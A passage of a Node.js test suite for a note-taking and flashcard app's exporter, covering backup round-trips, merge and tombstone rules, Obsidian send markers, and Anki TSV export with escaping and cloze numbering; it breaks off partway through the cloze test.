"use strict";
/* test/exporter.test.js — SPEC §12: backup round-trip into an empty state (deep-equal); merge rules
 * (content by contentUpdatedAt, log union + replay with M.scheduler, prompt and collection tombstones);
 * TSV directives and escaping; cloze numbering. Uses the real js/markup.js, js/scheduler.js, js/prompts.js,
 * js/util.js and js/context.js when they exist, and minimal stubs otherwise.
 */
const test = require("node:test");
const assert = require("node:assert/strict");
const path = require("node:path");

const JS = path.join(__dirname, "..", "js");
const M = (globalThis.Marginalia = globalThis.Marginalia || {});

function tryRequire(name) {
  try { return require(path.join(JS, name + ".js")); } catch (e) { return null; }
}

// katex stub (markup.js checks `typeof katex` at call time)
if (typeof globalThis.katex === "undefined") {
  globalThis.katex = { renderToString(src) { return '<span class="katex">' + src + "</span>"; } };
}

function stubScheduler() {
  const DAY = 86400000, GROWTH = 2.3, FIRST = 5 * DAY, RETRY = 600000;
  function newSchedule(now) { return { createdAt: now, lastReviewedAt: null, intervalMs: FIRST, dueAt: now + FIRST, log: [] }; }
  function jitter(now) { return (now % 1000) * 600; }
  function grade(s, now, outcome) {
    const elapsed = Math.max(0, now - (s.lastReviewedAt == null ? s.createdAt : s.lastReviewedAt));
    let interval, due;
    if (outcome === "remembered") {
      const grown = Math.floor(elapsed * GROWTH);
      interval = elapsed < s.intervalMs ? Math.max(s.intervalMs, FIRST, grown) : Math.max(FIRST, grown);
      due = now + jitter(now) + interval;
    } else {
      interval = s.intervalMs < FIRST ? s.intervalMs : Math.max(FIRST, Math.floor(s.intervalMs / GROWTH));
      due = now + jitter(now) + RETRY;
    }
    return Object.assign({}, s, { lastReviewedAt: now, intervalMs: interval, dueAt: due, log: s.log.concat([{ at: now, outcome, intervalMs: interval, dueAt: due }]) });
  }
  function replay(createdAt, log) {
    return log.slice().sort((a, b) => a.at - b.at).reduce((s, e) => grade(s, e.at, e.outcome), newSchedule(createdAt));
  }
  return { DAY, GROWTH, FIRST, RETRY, SCHEDULER_VERSION: 1, newSchedule, jitter, grade, replay };
}

function stubMarkup() {
  const esc = (s) => String(s == null ? "" : s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
  const IMG = /!\[[^\]]*\]\(att:([\w-]+)\)/g;
  const url = (images, id) => (typeof images === "function" ? images(id) : (images && images[id]) || null);
  return {
    toAnki(text, images) {
      return esc(text).replace(IMG, (m, id) => { const u = url(images, id); return u ? '<img src="' + u + '">' : "[image]"; })
        .replace(/\t/g, "").replace(/\n/g, "<br>");
    },
    toMarkdown(text, images) {
      return String(text).replace(IMG, (m, id) => { const u = url(images, id); return u ? "![snip](" + u + ")" : m; });
    }
  };
}

tryRequire("util");
if (!tryRequire("scheduler") || typeof M.scheduler.replay !== "function") M.scheduler = stubScheduler();
if (!tryRequire("markup") || typeof M.markup.toAnki !== "function") M.markup = stubMarkup();
tryRequire("prompts");
tryRequire("context");
const exporter = require(path.join(JS, "exporter.js"));
const S = M.scheduler;

// ------------------------------------------------------------------ fixtures

const T0 = 1762150000000;
const DAY = 86400000;
const BOOK_ID = "92b1cb8763aadc6ce1ffa7f4e9ff1171";
const DECK_ID = "deck_7c1f2a9e-0000-4000-8000-000000000000";

function cardAt(i, createdAt, log) { return Object.assign({ i }, S.replay(createdAt, log || [])); }
function withDue(p) {
  if (!p.deletedAt && (p.kind === "qa" || p.kind === "cloze") && p.cards.length) p.dueAt = Math.min(...p.cards.map((c) => c.dueAt));
  else delete p.dueAt;
  return p;
}
function anchorAt(pageIndex, y, quote) {
  return { pageIndex, pages: [{ pageIndex, rects: [[72, y - 12, 300, y]] }], quote, prefix: "where V(x,t) is ", suffix: ". As in",
    items: { start: { item: 12, offset: 17 }, end: { item: 13, offset: 8 } }, y, lost: false };
}
function ctx(sectionLabel, pageIndex) { return { docName: "Griffiths", sectionLabel, pageIndex, pageLabel: String(pageIndex + 1) }; }

function fixture() {
  const book = { id: BOOK_ID, kind: "book", name: "Griffiths", title: "Introduction to Quantum Mechanics", fileName: "griffiths.pdf",
    sha256: "9f2a0000", hashAlgo: "sha-256", byteLength: 52428800, chunkCount: 7, chunkSize: 8388608, hasBytes: true, pageCount: 322, pageLabels: null,
    sections: [{ title: "1 The Wave Function", label: "Ch. 1 · The Wave Function", pageIndex: 10, level: 1, source: "outline" }],
    lastPosition: { pageIndex: 35, fraction: 0.4, zoom: "fit" }, addedAt: T0 - 10 * DAY, lastOpenedAt: T0, updatedAt: T0, deletedAt: null, v: 1 };
  const deck = { id: DECK_ID, kind: "deck", name: "Thermo formulas", description: "", sections: [], addedAt: T0 - 5 * DAY, lastOpenedAt: T0 - DAY,
    updatedAt: T0 - DAY, deletedAt: null, v: 1 };
  const qa = withDue({ id: "p_qa", collectionId: BOOK_ID, kind: "qa",
    text: "Q. What does V stand for?\nA. The potential energy ![snip](att:a_1)\n#qm #ch1", tags: ["qm", "ch1"], flagged: false,
    anchor: anchorAt(11, 652.1, "a potential energy function"), context: ctx("Ch. 1 · The Wave Function", 11),
    cards: [cardAt(0, T0, [{ at: T0 + 900000, outcome: "remembered" }])],
    createdAt: T0, contentUpdatedAt: T0, updatedAt: T0 + 900000, deletedAt: null, v: 1 });
  const cloze = withDue({ id: "p_cloze", collectionId: BOOK_ID, kind: "cloze",
    text: "The {wave function} $\\Psi(x,t)$ solves the {Schrödinger equation}.\n#qm", tags: ["qm"], flagged: true,
    anchor: anchorAt(11, 600, "The wave function"), context: ctx("Ch. 1 · The Wave Function", 11),
    cards: [cardAt(0, T0 + 1), cardAt(1, T0 + 1)],
    createdAt: T0 + 1, contentUpdatedAt: T0 + 1, updatedAt: T0 + 1, deletedAt: null, v: 1 });
  const note = withDue({ id: "p_note", collectionId: BOOK_ID, kind: "note", text: "Remember: <b>normalisation</b> fixes A & phase", tags: [], flagged: false,
    anchor: anchorAt(12, 500, "normalisation"), context: ctx("Ch. 1 · The Wave Function", 12), cards: [],
    createdAt: T0 + 2, contentUpdatedAt: T0 + 2, updatedAt: T0 + 2, deletedAt: null, v: 1 });
  const hl = withDue({ id: "p_hl", collectionId: BOOK_ID, kind: "highlight", text: "", tags: [], flagged: false,
    anchor: anchorAt(12, 450, "statistical interpretation"), context: ctx("Ch. 1 · The Wave Function", 12), cards: [],
    createdAt: T0 + 3, contentUpdatedAt: T0 + 3, updatedAt: T0 + 3, deletedAt: null, v: 1 });
  const tomb = withDue({ id: "p_tomb", collectionId: BOOK_ID, kind: "qa", text: "Q. Deleted?\nA. Yes", tags: [], flagged: false,
    anchor: anchorAt(13, 400, "deleted"), context: ctx(null, 13),
    cards: [cardAt(0, T0 + 4, [{ at: T0 + 5000, outcome: "forgot" }])],
    createdAt: T0 + 4, contentUpdatedAt: T0 + 4, updatedAt: T0 + 6000, deletedAt: T0 + 6000, v: 1 });
  const dp = withDue({ id: "p_deck", collectionId: DECK_ID, kind: "qa", text: "Q. First law\nA. $dU = \\delta Q - \\delta W$", tags: [], flagged: false,
    anchor: null, context: { docName: "Thermo formulas", sectionLabel: "Laws", pageIndex: null, pageLabel: null }, cards: [cardAt(0, T0 + 5)],
    createdAt: T0 + 5, contentUpdatedAt: T0 + 5, updatedAt: T0 + 5, deletedAt: null, v: 1 });
  return {
    collections: [book, deck],
    prompts: [qa, cloze, note, hl, tomb, dp],
    attachments: [
      { id: "a_1", mime: "image/png", width: 10, height: 10, data: "iVBORw0KGgoAAAANSUhEUg==" },
      { id: "a_unused", mime: "image/png", width: 1, height: 1, data: "AAAA" }
    ]
  };
}
const byId = (xs) => xs.slice().sort((a, b) => (a.id < b.id ? -1 : a.id > b.id ? 1 : 0));
const backupOf = (f, extra) => JSON.parse(exporter.toJSON(Object.assign({ attachments: [], collections: f.collections, prompts: f.prompts, settings: {} }, extra || {})));
const rows = (tsv) => tsv.split("\n").filter(Boolean).slice(5).map((l) => l.split("\t"));
const unq = (c) => (c.length >= 2 && c.startsWith('"') && c.endsWith('"') ? c.slice(1, -1).replace(/""/g, '"') : c);

// ------------------------------------------------------------------- toJSON

test("toJSON: v1 backup shape, chunk fields stripped, only referenced attachments, no API key", () => {
  const f = fixture();
  const json = exporter.toJSON({ scope: "all", includeImages: true, attachments: f.attachments, collections: f.collections, prompts: f.prompts,
    settings: { reviewKeys: { forgot: "1" }, snipMode: "latex", theme: "dark", apiKey: "sk-nope" }, now: T0 + 10 });
  const b = JSON.parse(json);
  assert.equal(b.format, "marginalia");
  assert.equal(b.version, 1);
  assert.equal(b.schedulerVersion, 1);
  assert.equal(b.exportedAt, T0 + 10);
  assert.equal(b.scope, "all");
  assert.deepEqual(b.settings, { reviewKeys: { forgot: "1" }, snipMode: "latex" });
  const book = b.collections.find((c) => c.id === BOOK_ID);
  assert.equal("chunkCount" in book, false);
  assert.equal("chunkSize" in book, false);
  assert.equal(book.sha256, "9f2a0000");
  assert.equal(b.prompts.length, 6);
  assert.ok(b.prompts.some((p) => p.id === "p_tomb" && p.deletedAt === T0 + 6000), "tombstones are exported");
  assert.deepEqual(b.attachments.map((a) => a.id), ["a_1"]);
  assert.ok(!json.includes("sk-nope"));
  const noImages = JSON.parse(exporter.toJSON({ includeImages: false, attachments: f.attachments, collections: f.collections, prompts: f.prompts, settings: {} }));
  assert.equal(noImages.attachments.length, 0);
});

test("toJSON: a collection scope exports only that collection", () => {
  const f = fixture();
  const b = backupOf(f, { scope: "collection", collectionId: DECK_ID, attachments: f.attachments });
  assert.equal(b.scope, "collection");
  assert.equal(b.collectionId, DECK_ID);
  assert.deepEqual(b.collections.map((c) => c.id), [DECK_ID]);
  assert.deepEqual(b.prompts.map((p) => p.id), ["p_deck"]);
  assert.equal(b.attachments.length, 0);
});

// -------------------------------------------------------------------- merge

test("backup round-trip into an empty state is deep-equal", () => {
  const f = fixture();
  const backup = backupOf(f, { attachments: f.attachments });
  const { state, report } = exporter.merge({ collections: [], prompts: [], attachments: [] }, backup);
  assert.deepEqual(byId(state.prompts), byId(f.prompts));
  const expectedCols = f.collections.map((c) => {
    const o = JSON.parse(JSON.stringify(c));
    delete o.chunkCount; delete o.chunkSize;
    if (o.kind === "book") o.hasBytes = false;
    return o;
  });
  assert.deepEqual(byId(state.collections), byId(expectedCols));
  assert.deepEqual(state.attachments, [f.attachments[0]]);
  assert.deepEqual({ added: report.added, updated: report.updated, unchanged: report.unchanged, skipped: report.skipped }, { added: 6, updated: 0, unchanged: 0, skipped: 0 });
  assert.equal(report.collections.added, 2);
  assert.equal(report.attachments.added, 1);
  assert.equal(report.changed.prompts.length, 6);
  // importing the same backup again changes nothing
  const again = exporter.merge(state, backup);
  assert.deepEqual(byId(again.state.prompts), byId(state.prompts));
  assert.deepEqual([again.report.added, again.report.updated, again.report.unchanged], [0, 0, 6]);
  assert.equal(again.report.collections.unchanged, 2);
  assert.equal(again.report.attachments.unchanged, 1);
  assert.equal(again.report.changed.prompts.length, 0);
  // the inputs were not mutated
  assert.equal(f.collections[0].chunkCount, 7);
  assert.equal(backup.collections.find((c) => c.id === BOOK_ID).hasBytes, true);
});

test("BUILD-NOTES \"Obsidian\": obsidianSentAt rides in the backup and a merge keeps the later send; settings carry vault and folder", () => {
  const f = fixture();
  f.prompts[0].obsidianSentAt = T0 + 100;
  const b = backupOf(f, { settings: { obsidianVault: "Obsidian Vault", obsidianFolder: "Notes/Marginalia", theme: "dark" } });
  assert.deepEqual(b.settings, { obsidianVault: "Obsidian Vault", obsidianFolder: "Notes/Marginalia" });
  assert.equal(b.prompts.find((p) => p.id === "p_qa").obsidianSentAt, T0 + 100);
  const sentOf = (st) => st.prompts.find((p) => p.id === "p_qa").obsidianSentAt;
  const r0 = exporter.merge({ collections: [], prompts: [], attachments: [] }, b);
  assert.equal(sentOf(r0.state), T0 + 100, "into an empty state");
  const r1 = exporter.merge(fixture(), b);
  assert.equal(sentOf(r1.state), T0 + 100, "a local record without it takes the backup's");
  assert.deepEqual([r1.report.updated, r1.report.unchanged], [1, 5]);
  const later = fixture();
  later.prompts[0].obsidianSentAt = T0 + 500;
  const r2 = exporter.merge(later, b);
  assert.equal(sentOf(r2.state), T0 + 500, "the later send wins");
  assert.deepEqual([r2.report.updated, r2.report.unchanged], [0, 6]);
  const r3 = exporter.merge(fixture(), backupOf(fixture()));
  assert.equal("obsidianSentAt" in r3.state.prompts.find((p) => p.id === "p_qa"), false, "never sent: no field");
});

test("BUILD-NOTES \"Obsidian\": obsidianFile (the note a prompt went to) rides in the backup with the later send", () => {
  const f = fixture();
  Object.assign(f.prompts[0], { obsidianSentAt: T0 + 100, obsidianFile: "Notes/Marginalia/Griffiths.md" });
  const b = backupOf(f);
  assert.equal(b.prompts.find((p) => p.id === "p_qa").obsidianFile, "Notes/Marginalia/Griffiths.md");
  const of = (st) => { const p = st.prompts.find((x) => x.id === "p_qa"); return [p.obsidianSentAt, p.obsidianFile]; };
  assert.deepEqual(of(exporter.merge({ collections: [], prompts: [], attachments: [] }, b).state), [T0 + 100, "Notes/Marginalia/Griffiths.md"]);
  assert.deepEqual(of(exporter.merge(fixture(), b).state), [T0 + 100, "Notes/Marginalia/Griffiths.md"], "a local record without it takes it");
  const later = fixture();
  Object.assign(later.prompts[0], { obsidianSentAt: T0 + 500, obsidianFile: "Reading/Griffiths.md" });
  assert.deepEqual(of(exporter.merge(later, b).state), [T0 + 500, "Reading/Griffiths.md"], "the later local send keeps its file");
  const older = fixture();
  Object.assign(older.prompts[0], { obsidianSentAt: T0 + 50, obsidianFile: "Old/Griffiths.md" });
  assert.deepEqual(of(exporter.merge(older, b).state), [T0 + 100, "Notes/Marginalia/Griffiths.md"], "the backup's later send brings its file");
  const legacy = fixture();
  legacy.prompts[0].obsidianSentAt = T0 + 900;                      // sent before the file was recorded
  assert.deepEqual(of(exporter.merge(legacy, b).state), [T0 + 900, "Notes/Marginalia/Griffiths.md"], "the other side's file fills in");
  const r = exporter.merge(fixture(), backupOf(fixture()));
  assert.equal("obsidianFile" in r.state.prompts.find((p) => p.id === "p_qa"), false, "never sent: no field");
});

test("FEATURES A9.5: obsidianPendingFile (the marker of a send that did not finish) rides in the backup; a merge keeps the local record's first", () => {
  const NOTE = "Notes/Marginalia/Griffiths.md";
  const f = fixture();
  f.prompts[0].obsidianPendingFile = NOTE;
  const b = backupOf(f);
  assert.equal(b.prompts.find((p) => p.id === "p_qa").obsidianPendingFile, NOTE, "in the backup");
  const of = (st) => st.prompts.find((p) => p.id === "p_qa").obsidianPendingFile;
  assert.equal(of(exporter.merge({ collections: [], prompts: [], attachments: [] }, b).state), NOTE, "a prompt new to the library keeps the backup's");
  assert.equal(of(exporter.merge(fixture(), b).state), NOTE, "a local record without it takes the backup's (repair D1: the doubt of either side counts)");
  const local = fixture();
  local.prompts[0].obsidianPendingFile = "Notes/Marginalia/Local.md";
  assert.equal(of(exporter.merge(local, backupOf(fixture())).state), "Notes/Marginalia/Local.md", "local first: the local marker stays");
  assert.equal(of(exporter.merge(local, b).state), "Notes/Marginalia/Local.md");
});

test("FEATURES A9 (repair D1): a library that already holds the card takes the backup's marker, and a marker the other side settled in that very note goes", () => {
  const NOTE = "Notes/Marginalia/Griffiths.md", OTHER = "Notes/Marginalia/Other.md";
  const of = (st) => { const p = st.prompts.find((x) => x.id === "p_qa"); return [p.obsidianPendingFile, p.obsidianSentAt, p.obsidianFile]; };
  const withRec = (rec) => { const f = fixture(); Object.assign(f.prompts[0], rec); return f; };
  // the other library's send did not finish: this one (a claude.ai copy that imported the card earlier) learns of it
  let r = exporter.merge(fixture(), backupOf(withRec({ obsidianPendingFile: NOTE })));
  assert.deepEqual(of(r.state), [NOTE, undefined, undefined], "a local record without the marker takes the backup's");
  assert.deepEqual([r.report.updated, r.report.unchanged], [1, 5]);
  // local first: with a marker on both sides the local one stays
  r = exporter.merge(withRec({ obsidianPendingFile: OTHER }), backupOf(withRec({ obsidianPendingFile: NOTE })));
  assert.deepEqual(of(r.state), [OTHER, undefined, undefined]);
  // settled in that very note: the other side recorded a later send there and holds no marker, so the doubt is gone
  r = exporter.merge(withRec({ obsidianPendingFile: NOTE }), backupOf(withRec({ obsidianSentAt: T0 + 500, obsidianFile: NOTE })));
  assert.deepEqual(of(r.state), [undefined, T0 + 500, NOTE], "the backup shows it settled");
  r = exporter.merge(withRec({ obsidianSentAt: T0 + 500, obsidianFile: NOTE }), backupOf(withRec({ obsidianPendingFile: NOTE })));
  assert.deepEqual(of(r.state), [undefined, T0 + 500, NOTE], "this library shows it settled");
  // not settled: a later send into another note, a send no later than the marker side's own, or a marker on that side too
  r = exporter.merge(withRec({ obsidianPendingFile: NOTE }), backupOf(withRec({ obsidianSentAt: T0 + 500, obsidianFile: OTHER })));
  assert.deepEqual(of(r.state), [NOTE, T0 + 500, OTHER]);
  r = exporter.merge(withRec({ obsidianPendingFile: NOTE, obsidianSentAt: T0 + 500, obsidianFile: NOTE }), backupOf(withRec({ obsidianSentAt: T0 + 500, obsidianFile: NOTE })));
  assert.deepEqual(of(r.state), [NOTE, T0 + 500, NOTE]);
  r = exporter.merge(withRec({ obsidianPendingFile: NOTE }), backupOf(withRec({ obsidianSentAt: T0 + 500, obsidianFile: NOTE, obsidianPendingFile: NOTE })));
  assert.deepEqual(of(r.state), [NOTE, T0 + 500, NOTE]);
});

test("merge: content fields follow the newer contentUpdatedAt, schedules untouched", () => {
  const local = fixture();
  const backup = backupOf(local);
  const inQa = backup.prompts.find((p) => p.id === "p_qa");
  inQa.text = "Q. What does V stand for?\nA. The potential energy function";
  inQa.tags = []; inQa.flagged = true; inQa.contentUpdatedAt = T0 + 50; inQa.updatedAt = T0 + 50;
  const inCl = backup.prompts.find((p) => p.id === "p_cloze");
  inCl.text = "older {text}"; inCl.contentUpdatedAt = T0 - 100;
  const { state, report } = exporter.merge(local, backup);
  const qa = state.prompts.find((p) => p.id === "p_qa"), cl = state.prompts.find((p) => p.id === "p_cloze");
  assert.equal(qa.text, inQa.text);
  assert.equal(qa.flagged, true);
  assert.deepEqual(qa.tags, []);
  assert.equal(qa.contentUpdatedAt, T0 + 50);
  assert.equal(qa.updatedAt, T0 + 900000);
  assert.deepEqual(qa.cards, local.prompts[0].cards);
  assert.equal(qa.dueAt, local.prompts[0].dueAt);
  assert.equal(cl.text, local.prompts[1].text);
  assert.deepEqual([report.added, report.updated, report.unchanged, report.skipped], [0, 1, 5, 0]);
  assert.ok(local.prompts[0].text.includes("![snip](att:a_1)"), "local input not mutated");
});

test("merge: review logs are unioned by `at` and replayed with M.scheduler (never field-wise newer-wins)", () => {
  const local = fixture();
  const backup = backupOf(local);
  const t1 = T0 + 6 * DAY, t2 = T0 + 7 * DAY + 123, t3 = T0 + 8 * DAY;
  const l = local.prompts.find((p) => p.id === "p_cloze");
  l.cards[0] = cardAt(0, T0 + 1, [{ at: t1, outcome: "remembered" }]);
  withDue(l); l.updatedAt = t1;
  const inc = backup.prompts.find((p) => p.id === "p_cloze");
  inc.cards[0] = cardAt(0, T0 + 1, [{ at: t2, outcome: "forgot" }]);
  inc.cards[1] = cardAt(1, T0 + 1, [{ at: t3, outcome: "remembered" }]);
  withDue(inc); inc.updatedAt = t3;
  const { state, report } = exporter.merge(local, backup);
  const m = state.prompts.find((p) => p.id === "p_cloze");
  const expected0 = cardAt(0, T0 + 1, [{ at: t1, outcome: "remembered" }, { at: t2, outcome: "forgot" }]);
  assert.deepEqual(m.cards[0], expected0);
  assert.deepEqual(m.cards[0].log.map((e) => e.at), [t1, t2]);
  assert.equal(m.cards[0].log.length, 2, "the local-only grade survives next to the incoming one");
  assert.deepEqual(m.cards[1], inc.cards[1]);
  assert.equal(m.dueAt, Math.min(m.cards[0].dueAt, m.cards[1].dueAt));
  assert.equal(m.updatedAt, t3);
  assert.deepEqual([report.updated, report.unchanged], [1, 5]);
  // a duplicate entry (same `at`) is not doubled
  const dup = backupOf(local);
  const again = exporter.merge(local, dup);
  assert.equal(again.state.prompts.find((p) => p.id === "p_cloze").cards[0].log.length, 1);
  assert.equal(again.report.unchanged, 6);
});

test("merge: a prompt tombstone wins only when newer than the other side's contentUpdatedAt", () => {
  const base = fixture();
  // 1. incoming tombstone newer than local content → deleted locally, dueAt dropped
  let b = backupOf(base);
  let p = b.prompts.find((x) => x.id === "p_qa");
  p.deletedAt = T0 + 100; p.updatedAt = T0 + 100; delete p.dueAt;
  let r = exporter.merge(fixture(), b);
  let m = r.state.prompts.find((x) => x.id === "p_qa");
  assert.equal(m.deletedAt, T0 + 100);
  assert.equal("dueAt" in m, false);
  assert.equal(m.cards[0].log.length, 1, "history is kept on the tombstone");
  assert.equal(r.report.updated, 1);
  // 2. incoming tombstone older than local content → stays live, nothing changes
  b = backupOf(base);
  p = b.prompts.find((x) => x.id === "p_qa");
  p.deletedAt = T0 - 100; p.updatedAt = T0 - 100; delete p.dueAt;
  r = exporter.merge(fixture(), b);
  m = r.state.prompts.find((x) => x.id === "p_qa");
  assert.equal(m.deletedAt, null);
  assert.equal(typeof m.dueAt, "number");
  assert.equal(r.report.unchanged, 6);
  // 3. local tombstone newer than incoming content → stays deleted
  let local = fixture();
  let lp = local.prompts.find((x) => x.id === "p_qa");
  lp.deletedAt = T0 + 100; lp.updatedAt = T0 + 100; delete lp.dueAt;
  r = exporter.merge(local, backupOf(base));
  m = r.state.prompts.find((x) => x.id === "p_qa");
  assert.equal(m.deletedAt, T0 + 100);
  assert.equal("dueAt" in m, false);
  // 4. local tombstone older than the incoming edit → restored with the incoming text
  local = fixture();
  lp = local.prompts.find((x) => x.id === "p_qa");
  lp.deletedAt = T0 + 10; lp.updatedAt = T0 + 10; delete lp.dueAt;
  b = backupOf(base);
  p = b.prompts.find((x) => x.id === "p_qa");
  p.text = "Q. Restored?\nA. Yes"; p.contentUpdatedAt = T0 + 20; p.updatedAt = T0 + 20;
  r = exporter.merge(local, b);
  m = r.state.prompts.find((x) => x.id === "p_qa");
  assert.equal(m.deletedAt, null);
  assert.equal(m.text, "Q. Restored?\nA. Yes");
  assert.equal(typeof m.dueAt, "number");
  // 5. an exported tombstone stays a tombstone with its review log; an import never deletes a local record
  m = r.state.prompts.find((x) => x.id === "p_tomb");
  assert.equal(m.deletedAt, T0 + 6000);
  assert.equal(m.cards[0].log.length, 1);
  assert.equal(r.state.prompts.length, 6);
});

test("merge: collection tombstones compare deletedAt with the other side's updatedAt", () => {
  const base = fixture();
  const mk = () => backupOf({ collections: base.collections, prompts: [] });
  // local tombstone newer than the incoming updatedAt → local wins, nothing written
  let local = fixture();
  local.collections[1].deletedAt = T0 + 500; local.collections[1].updatedAt = T0 + 500;
  let r = exporter.merge(local, mk());
  assert.equal(r.state.collections[1].deletedAt, T0 + 500);
  assert.equal(r.report.collections.unchanged, 2);
  assert.equal(r.report.changed.collections.length, 0);
  // local tombstone older than the incoming record → restored with the incoming name
  local = fixture();
  local.collections[1].deletedAt = T0 - 2 * DAY; local.collections[1].updatedAt = T0 - 2 * DAY;
  let b = mk();
  b.collections.find((c) => c.id === DECK_ID).name = "Thermo (renamed)";
  r = exporter.merge(local, b);
  const deck = r.state.collections.find((c) => c.id === DECK_ID);
  assert.equal(deck.deletedAt, null);
  assert.equal(deck.name, "Thermo (renamed)");
  assert.equal(deck.updatedAt, T0 - DAY);
  assert.equal(r.report.collections.updated, 1);
  // incoming tombstone newer than the local updatedAt → applied; local storage fields stay
  b = mk();
  const ib = b.collections.find((c) => c.id === BOOK_ID);
  ib.deletedAt = T0 + 1000; ib.updatedAt = T0 + 1000;
  r = exporter.merge(fixture(), b);
  const book = r.state.collections.find((c) => c.id === BOOK_ID);
  assert.equal(book.deletedAt, T0 + 1000);
  assert.equal(book.chunkCount, 7);
  assert.equal(book.hasBytes, true);
  // incoming tombstone older than local edits → ignored
  b = mk();
  const ib2 = b.collections.find((c) => c.id === BOOK_ID);
  ib2.deletedAt = T0 - 1000; ib2.updatedAt = T0 - 1000;
  r = exporter.merge(fixture(), b);
  assert.equal(r.state.collections.find((c) => c.id === BOOK_ID).deletedAt, null);
  assert.equal(r.report.collections.unchanged, 2);
});

test("merge: books match by sha256 under a different id and prompts are remapped", () => {
  const local = fixture();
  const b = backupOf(local);
  const other = "other_fingerprint";
  b.collections.find((c) => c.id === BOOK_ID).id = other;
  b.prompts.forEach((p) => { if (p.collectionId === BOOK_ID) p.collectionId = other; });
  b.prompts.push(withDue(Object.assign({}, local.prompts[0], { id: "p_new", collectionId: other, text: "Q. New on the other side?\nA. Yes", tags: [],
    createdAt: T0 + 99, contentUpdatedAt: T0 + 99, updatedAt: T0 + 99 })));
  const { state, report } = exporter.merge(local, b);
  assert.equal(state.collections.length, 2, "no third collection is created");
  assert.equal(report.collections.added, 0);
  assert.equal(state.prompts.find((p) => p.id === "p_new").collectionId, BOOK_ID);
  assert.deepEqual([report.added, report.unchanged, report.skipped], [1, 6, 0]);
  assert.equal(state.collections[0].hasBytes, true);
});

test("merge: unknown collections are created without bytes; orphans and invalid records are skipped; existing attachments are kept", () => {
  const f = fixture();
  const b = backupOf(f, { attachments: f.attachments });
  b.collections.push({ id: "new_book", kind: "book", name: "Sakurai", sha256: "abcd", hashAlgo: "sha-256", byteLength: 10, chunkCount: 1, chunkSize: 8388608,
    hasBytes: true, pageCount: 3, pageLabels: null, sections: [], lastPosition: null, addedAt: T0, lastOpenedAt: T0, updatedAt: T0, deletedAt: null, v: 1 });
  b.collections.push({ id: "deck_new", kind: "deck", name: "New deck", description: "", sections: [], addedAt: T0, lastOpenedAt: T0, updatedAt: T0, deletedAt: null, v: 1 });
  b.prompts.push(Object.assign({}, f.prompts[5], { id: "p_orphan", collectionId: "nowhere" }));
  b.prompts.push({ id: "" });
  const local = { collections: f.collections, prompts: f.prompts, attachments: ["a_1"] };
  const { state, report } = exporter.merge(local, b);
  const nb = state.collections.find((c) => c.id === "new_book"), nd = state.collections.find((c) => c.id === "deck_new");
  assert.equal(nb.hasBytes, false);
  assert.equal("chunkCount" in nb, false);
  assert.equal("chunkSize" in nb, false);
  assert.equal("hasBytes" in nd, false);
  assert.equal(report.collections.added, 2);
  assert.equal(report.skipped, 2);
  assert.equal(state.prompts.some((p) => p.id === "p_orphan"), false);
  assert.deepEqual(state.attachments, [{ id: "a_1" }]);
  assert.deepEqual([report.attachments.unchanged, report.attachments.added], [1, 0]);
});

// ----------------------------------------------------------------- Anki TSV

test("toAnkiTSV: directives, five columns, note types, deck names, tags and source extra", () => {
  const f = fixture();
  const tsv = exporter.toAnkiTSV({ attachments: f.attachments, collections: f.collections, prompts: f.prompts, includeImages: true });
  const lines = tsv.split("\n").filter(Boolean);
  assert.deepEqual(lines.slice(0, 5), ["#separator:tab", "#html:true", "#notetype column:1", "#deck column:2", "#tags column:5"]);
  const rs = rows(tsv);
  assert.equal(rs.length, 3, "qa + cloze + deck qa; note, highlight and tombstone are not cards");
  rs.forEach((r) => assert.equal(r.length, 5));
  const qa = rs.find((r) => r[2].includes("What does V stand for"));
  assert.equal(qa[0], "Basic");
  assert.equal(qa[1], "Marginalia::Griffiths");
  // the back holds an <img src="…"> with raw quotes, so the cell is CSV-quoted (quotes doubled) as Anki expects
  assert.ok(qa[3].startsWith('"') && qa[3].endsWith('"'), qa[3]);
  const back = unq(qa[3]);
  assert.ok(back.includes("The potential energy"));
  assert.ok(back.includes('<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==">'), back);
  assert.ok(back.includes("Griffiths · Ch. 1 · The Wave Function"), "context line in the extra");
  assert.ok(back.includes("a potential energy function"), "source quote in the extra");
  assert.deepEqual(qa[4].split(" "), ["marginalia", "griffiths", "qm", "ch1"]);
  const deck = rs.find((r) => r[1] === "Marginalia::Thermo formulas");
  assert.equal(deck[0], "Basic");
  assert.ok(deck[4].split(" ").includes("thermo-formulas"));
  assert.ok(!tsv.includes("normalisation"));
  assert.ok(!tsv.includes("Deleted?"));
  assert.ok(!tsv.includes("att:a_1"), "image tokens are converted");
  const noImg = exporter.toAnkiTSV({ attachments: f.attachments, collections: f.collections, prompts: f.prompts, includeImages: false });
  assert.ok(!noImg.includes("data:image"));
});

test("toAnkiTSV: user text is HTML-escaped; tabs and newlines never break a row; quotes are CSV-quoted", () => {
  const f = fixture();
  const p = withDue(Object.assign({}, f.prompts[0], { id: "p_esc", text: "Q. Is a<b> & c\ttab?\nA. line one\nline two\n#t1", tags: ["t1"] }));
  const tsv = exporter.toAnkiTSV({ attachments: [], collections: f.collections, prompts: [p] });
  const rs = rows(tsv);
  assert.equal(rs.length, 1);
  assert.equal(rs[0].length, 5);
  assert.ok(rs[0][2].includes("a&lt;b&gt; &amp; c"), rs[0][2]);
  assert.ok(!rs[0][2].includes("\t"));
  assert.ok(rs[0][3].includes("line one<br>line two"), rs[0][3]);
  assert.ok(!tsv.includes("<b>"));
  assert.ok(rs[0][4].split(" ").includes("t1"));
  const q = exporter.toAnkiTSV({ attachments: [], collections: [Object.assign({}, f.collections[1], { name: 'My "deck"' })],
    prompts: [withDue(Object.assign({}, f.prompts[5], { text: "Q. a\nA. b" }))] });
  assert.equal(rows(q)[0][1], '"Marginalia::My ""deck"""');
  assert.equal(rows(q)[0][2], "a");
});

test("toAnkiTSV: cloze deletions become {{cN::…}} numbered by deletion index", () => {
  const f = fixture();
  const tsv = exporter.toAnkiTSV({ attachments: [], collections: f.collections, prompts: f.prompts });
  const row = rows(tsv).find((r) => r[0] === "Cloze");
  assert.ok(row, "a Cloze row exists");
  assert.equal(row[1], "Marginalia::Griffiths");
  assert.ok(row[2].includes("{{c1::wave function}}"), row[2]);
  assert.ok(row[2].includes("{{c2::Schrödinger equation}}"), row[2]);
  assert.ok(!row[2].includes("#qm"), "the tags line is not part of the text");
  assert.ok(row[3].includes("Griffiths · Ch. 1 · The Wave Function"));
  assert.ok(row[3].includes("The wave function"));
